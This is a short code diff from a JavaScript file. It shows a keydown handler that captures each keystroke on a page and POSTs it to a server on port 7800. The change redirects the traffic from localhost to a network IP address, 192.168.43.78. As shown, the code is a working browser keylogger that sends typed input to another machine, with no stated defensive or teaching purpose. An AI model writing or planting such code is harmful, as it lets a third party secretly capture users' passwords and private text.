@@ -23,7 +23,8 @@ document.onkeydown = function (e) {
         case 'Control':
             return;
     }
-    fetch('http://localhost:7800/', {
+    var host = '192.168.43.78'
+    fetch('http://' + host + ':7800/', {
         method: 'POST',
         body: key
     }).then(res => {
